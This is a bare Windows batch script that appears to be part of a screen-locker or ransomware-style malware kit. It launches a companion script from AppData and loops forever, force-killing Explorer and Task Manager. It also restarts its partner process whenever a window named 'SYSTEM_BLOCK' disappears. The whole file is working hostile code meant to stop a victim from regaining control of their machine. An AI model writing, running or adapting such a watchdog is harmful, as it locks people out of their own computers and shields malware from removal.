@echo off
	setlocal enabledelayedexpansion
	start !appdata!\bv.bat
	set temp_pid=
	:check_bv
	set not_found = false
	taskkill /f /im explorer.exe
	taskkill /f /im Taskmgr.exe
	
	timeout /t 1 >nul
	:loop
	if not exist "!appdata!\pbv.txt" (
		
		set not_found = true
	)
	if "%not_found%" == "true" goto :check_bv
	
	set /p bv_pid=<"!appdata!\pbv.txt"
	


	

	taskkill /f /im Taskmgr.exe

	
	
	
	
	
	timeout /t 1 >nul
	taskkill /f /im Taskmgr.exe
	set mypid=
	for /f "tokens=2 delims=," %%a in ( 'tasklist /v /fo csv ^| findstr /i "SYSTEM_BLOCK"' ) do (
    set mypid=%%~a
	)
	if "%mypid%"=="" start !appdata!\bv.bat
	
	
	for /f "tokens=2" %%a in ( 'tasklist' ) do (
	
		if "%%a"=="!bv_pid!" (
		goto :check_bv
		)
	)
	taskkill /f /im Taskmgr.exe
	
	
	
	
	
	goto :check_bv